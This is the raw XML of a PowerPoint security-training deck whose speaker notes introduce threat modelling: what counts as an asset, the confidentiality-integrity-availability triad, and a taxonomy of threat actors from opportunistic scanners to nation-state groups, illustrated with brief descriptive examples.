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5"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="259" r:id="rId4"/>
    <p:sldId id="276" r:id="rId5"/>
    <p:sldId id="279" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="262" r:id="rId8"/>
    <p:sldId id="263" r:id="rId9"/>
    <p:sldId id="264" r:id="rId10"/>
    <p:sldId id="258" r:id="rId11"/>
    <p:sldId id="265" r:id="rId12"/>
    <p:sldId id="261" r:id="rId13"/>
    <p:sldId id="266" r:id="rId14"/>
    <p:sldId id="267" r:id="rId15"/>
    <p:sldId id="268" r:id="rId16"/>
    <p:sldId id="269" r:id="rId17"/>
    <p:sldId id="270" r:id="rId18"/>
    <p:sldId id="271" r:id="rId19"/>
    <p:sldId id="272" r:id="rId20"/>
    <p:sldId id="273" r:id="rId21"/>
    <p:sldId id="274" r:id="rId22"/>
    <p:sldId id="275" r:id="rId23"/>
    <p:sldId id="280" r:id="rId24"/>
    <p:sldId id="282" r:id="rId25"/>
    <p:sldId id="283" r:id="rId26"/>
    <p:sldId id="284" r:id="rId27"/>
    <p:sldId id="285" r:id="rId28"/>
    <p:sldId id="286" r:id="rId29"/>
    <p:sldId id="287" r:id="rId30"/>
    <p:sldId id="290" r:id="rId31"/>
    <p:sldId id="291" r:id="rId32"/>
    <p:sldId id="278" r:id="rId33"/>
    <p:sldId id="281" r:id="rId34"/>
    <p:sldId id="289" r:id="rId35"/>
    <p:sldId id="393" r:id="rId36"/>
    <p:sldId id="394" r:id="rId37"/>
    <p:sldId id="396" r:id="rId38"/>
    <p:sldId id="398" r:id="rId39"/>
    <p:sldId id="399" r:id="rId40"/>
    <p:sldId id="400" r:id="rId41"/>
    <p:sldId id="401" r:id="rId42"/>
    <p:sldId id="402" r:id="rId43"/>
    <p:sldId id="403" r:id="rId44"/>
    <p:sldId id="404" r:id="rId45"/>
    <p:sldId id="405" r:id="rId46"/>
    <p:sldId id="288" r:id="rId47"/>
    <p:sldId id="293" r:id="rId48"/>
    <p:sldId id="294" r:id="rId49"/>
    <p:sldId id="295" r:id="rId50"/>
    <p:sldId id="296" r:id="rId51"/>
    <p:sldId id="297" r:id="rId52"/>
    <p:sldId id="298" r:id="rId53"/>
    <p:sldId id="299" r:id="rId54"/>
    <p:sldId id="301" r:id="rId55"/>
    <p:sldId id="300" r:id="rId56"/>
    <p:sldId id="302" r:id="rId57"/>
    <p:sldId id="304" r:id="rId58"/>
    <p:sldId id="305" r:id="rId59"/>
    <p:sldId id="306" r:id="rId60"/>
    <p:sldId id="307" r:id="rId61"/>
    <p:sldId id="308" r:id="rId62"/>
    <p:sldId id="309" r:id="rId63"/>
    <p:sldId id="310" r:id="rId64"/>
    <p:sldId id="311" r:id="rId65"/>
    <p:sldId id="322" r:id="rId66"/>
    <p:sldId id="314" r:id="rId67"/>
    <p:sldId id="325" r:id="rId68"/>
    <p:sldId id="326" r:id="rId69"/>
    <p:sldId id="323" r:id="rId70"/>
    <p:sldId id="324" r:id="rId71"/>
    <p:sldId id="327" r:id="rId72"/>
    <p:sldId id="321" r:id="rId73"/>
    <p:sldId id="316" r:id="rId74"/>
    <p:sldId id="328" r:id="rId75"/>
    <p:sldId id="329" r:id="rId76"/>
    <p:sldId id="330" r:id="rId77"/>
    <p:sldId id="331" r:id="rId78"/>
    <p:sldId id="332" r:id="rId79"/>
    <p:sldId id="333" r:id="rId80"/>
    <p:sldId id="319" r:id="rId81"/>
    <p:sldId id="334" r:id="rId82"/>
    <p:sldId id="335" r:id="rId83"/>
    <p:sldId id="336" r:id="rId84"/>
    <p:sldId id="337" r:id="rId85"/>
    <p:sldId id="338" r:id="rId86"/>
    <p:sldId id="339" r:id="rId87"/>
    <p:sldId id="340" r:id="rId88"/>
    <p:sldId id="341" r:id="rId89"/>
    <p:sldId id="343" r:id="rId90"/>
    <p:sldId id="344" r:id="rId91"/>
    <p:sldId id="364" r:id="rId92"/>
    <p:sldId id="365" r:id="rId93"/>
    <p:sldId id="366" r:id="rId94"/>
    <p:sldId id="345" r:id="rId95"/>
    <p:sldId id="353" r:id="rId96"/>
    <p:sldId id="355" r:id="rId97"/>
    <p:sldId id="354" r:id="rId98"/>
    <p:sldId id="346" r:id="rId99"/>
    <p:sldId id="348" r:id="rId100"/>
    <p:sldId id="349" r:id="rId101"/>
    <p:sldId id="350" r:id="rId102"/>
    <p:sldId id="351" r:id="rId103"/>
    <p:sldId id="357" r:id="rId104"/>
    <p:sldId id="358" r:id="rId105"/>
    <p:sldId id="360" r:id="rId106"/>
    <p:sldId id="359" r:id="rId107"/>
    <p:sldId id="361" r:id="rId108"/>
    <p:sldId id="362" r:id="rId109"/>
    <p:sldId id="363" r:id="rId110"/>
    <p:sldId id="384" r:id="rId111"/>
    <p:sldId id="385" r:id="rId112"/>
    <p:sldId id="386" r:id="rId113"/>
    <p:sldId id="387" r:id="rId114"/>
    <p:sldId id="388" r:id="rId115"/>
    <p:sldId id="389" r:id="rId116"/>
    <p:sldId id="390" r:id="rId117"/>
    <p:sldId id="406" r:id="rId118"/>
    <p:sldId id="407" r:id="rId119"/>
    <p:sldId id="408" r:id="rId120"/>
    <p:sldId id="409" r:id="rId121"/>
    <p:sldId id="342" r:id="rId122"/>
    <p:sldId id="367" r:id="rId123"/>
    <p:sldId id="369" r:id="rId124"/>
    <p:sldId id="368" r:id="rId125"/>
    <p:sldId id="370" r:id="rId126"/>
    <p:sldId id="371" r:id="rId127"/>
    <p:sldId id="372" r:id="rId128"/>
    <p:sldId id="373" r:id="rId129"/>
    <p:sldId id="374" r:id="rId130"/>
    <p:sldId id="375" r:id="rId131"/>
    <p:sldId id="376" r:id="rId132"/>
    <p:sldId id="377" r:id="rId133"/>
    <p:sldId id="378" r:id="rId134"/>
    <p:sldId id="379" r:id="rId135"/>
    <p:sldId id="380" r:id="rId136"/>
    <p:sldId id="381" r:id="rId137"/>
    <p:sldId id="382" r:id="rId138"/>
    <p:sldId id="392" r:id="rId139"/>
    <p:sldId id="411" r:id="rId140"/>
    <p:sldId id="410" r:id="rId141"/>
    <p:sldId id="412" r:id="rId142"/>
    <p:sldId id="414" r:id="rId143"/>
    <p:sldId id="413" r:id="rId144"/>
    <p:sldId id="416" r:id="rId145"/>
    <p:sldId id="417" r:id="rId146"/>
    <p:sldId id="415" r:id="rId147"/>
    <p:sldId id="418" r:id="rId148"/>
    <p:sldId id="420" r:id="rId149"/>
    <p:sldId id="421" r:id="rId150"/>
    <p:sldId id="422" r:id="rId151"/>
    <p:sldId id="423" r:id="rId152"/>
    <p:sldId id="419" r:id="rId153"/>
    <p:sldId id="425" r:id="rId154"/>
    <p:sldId id="424" r:id="rId155"/>
    <p:sldId id="426" r:id="rId156"/>
    <p:sldId id="427" r:id="rId157"/>
    <p:sldId id="428" r:id="rId158"/>
    <p:sldId id="430" r:id="rId159"/>
    <p:sldId id="429" r:id="rId160"/>
    <p:sldId id="432" r:id="rId161"/>
    <p:sldId id="431" r:id="rId162"/>
    <p:sldId id="433" r:id="rId163"/>
    <p:sldId id="434" r:id="rId164"/>
    <p:sldId id="435" r:id="rId165"/>
    <p:sldId id="438" r:id="rId166"/>
    <p:sldId id="436" r:id="rId167"/>
    <p:sldId id="440" r:id="rId168"/>
    <p:sldId id="439" r:id="rId169"/>
    <p:sldId id="441" r:id="rId170"/>
    <p:sldId id="442" r:id="rId171"/>
    <p:sldId id="443" r:id="rId172"/>
    <p:sldId id="448" r:id="rId173"/>
    <p:sldId id="444" r:id="rId174"/>
    <p:sldId id="445" r:id="rId175"/>
    <p:sldId id="446" r:id="rId176"/>
    <p:sldId id="447" r:id="rId177"/>
    <p:sldId id="449" r:id="rId178"/>
    <p:sldId id="450" r:id="rId179"/>
    <p:sldId id="454" r:id="rId180"/>
    <p:sldId id="452" r:id="rId181"/>
    <p:sldId id="455" r:id="rId182"/>
    <p:sldId id="464" r:id="rId183"/>
    <p:sldId id="451" r:id="rId184"/>
    <p:sldId id="456" r:id="rId185"/>
    <p:sldId id="457" r:id="rId186"/>
    <p:sldId id="458" r:id="rId187"/>
    <p:sldId id="459" r:id="rId188"/>
    <p:sldId id="460" r:id="rId189"/>
    <p:sldId id="462" r:id="rId190"/>
    <p:sldId id="463" r:id="rId191"/>
    <p:sldId id="465" r:id="rId192"/>
    <p:sldId id="461" r:id="rId193"/>
    <p:sldId id="466" r:id="rId1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2AB09-E85C-721B-1FD6-CC147432E098}" v="652" dt="2025-11-15T17:36:55.640"/>
    <p1510:client id="{02527A82-C3D2-408E-8501-7129026BDD89}" v="1302" dt="2025-11-16T11:16:43.594"/>
    <p1510:client id="{2A40BAB5-E87C-E90B-489B-546193D8D4F9}" v="1173" dt="2025-11-14T15:06:07.377"/>
    <p1510:client id="{F6FF3AD0-8AB5-4798-4F75-566AFED3D93B}" v="418" dt="2025-11-14T12:40:20.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notesMaster" Target="notesMasters/notes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presProps" Target="presProps.xml"/><Relationship Id="rId200" Type="http://schemas.microsoft.com/office/2015/10/relationships/revisionInfo" Target="revisionInfo.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7AB01-8970-4ECC-B506-1301681DDC58}" type="datetimeFigureOut">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124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3752470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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.practical-devsecops.com/api-gateway-security-best-practices/?utm_source=chatgpt.com" TargetMode="External"/><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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cdn.example.com" TargetMode="External"/><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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="../slides/slide178.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="../notesMasters/notesMaster1.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="Externa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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="../slides/slide180.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="../notesMasters/notesMaster1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="Externa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What constitutes protecting assets, and how do we know when they are protected?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>5</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1924203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fails when something valuable becomes exposed, altered, or unavailable. For each bug you fix, ask “Which C, I, or A is at stake?” If you can’t name one, it’s probably a non-security defect.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:t>10</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2499219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need to secure? Simply put – Assets. But what are our assets?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="223343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Also included - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Third-Party Repos &amp; Supply-Chain Dependencies (Open-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>sourcr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> libraries, SDK's, payment gateways, SaaS integrations), Operational Telemetry (logs, metrics, admin dashboards, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Just ask, 'what is worth protecting?'</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="213519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Against whom are we protecting our assets?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Also Included – Cyber Terrorists who target critical infrastructure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>13</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4262757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Ex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: hitting /admin or trying </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>admin:admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> once your service is internet-exposed.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>14</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21126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Double-pronged threat – can me malicious or careless</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Ex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: exporting customer CSV “to debug,” pushing to a public fork.</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17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1250005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50F2-7ABA-28B6-DFD5-66D362F31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8E56FB-F263-C487-4D60-CDE4E08DA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57F29-1338-2CF6-0907-9D41CB380E93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Famous Example: Julian Assange, Anonymous</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Ex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: defacing a marketing site, knocking a .gov website offline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3BFE9E8D-5EF6-30FB-CD21-C5AA468123A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="832035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E646-B2A7-37A9-BDF1-DF488C8E5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3D8B2-628A-06AD-62B4-545EEDBEB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7FA41-166F-7277-418C-9443B4402C30}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Famous Example: Julian Assange, Anonymous</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Ex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: buying leaked creds, replaying them against your login, then monetizing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Ex: Ransomware gangs – Lazarus Group</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5CC0BEA-84D1-6283-D8BD-EB69F529002C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2166165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6D8E-658C-41B5-5145-25A9D2446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15B98-39A7-1656-7909-D35112CD2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DC63C-4868-9B68-F6B6-633BA14C0401}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>The Top of the food chain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Return to slide 11: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Rule of thumb: Design to withstand #1–#3 by default; add controls for #4–#6 when your </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>asset value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>exposure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> demands it.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>There can be crossovers – e.g. Nation State actors can also perform cybercriminal activities – e.g. North Korea's Lazarus Group</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF2DEB6D-80B0-ED33-AFFC-F069B018DB57}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>18</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1919678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5945-9FE6-34E8-36D2-3E0F34A63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B7A30-DD57-5D7A-BDC3-4BA90AC98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AEA73-55E6-B858-1460-4BB820CCB204}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Usually Insiders and/or Cyber Criminals</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA708285-42F4-B521-732E-857D590E61F8}"/>
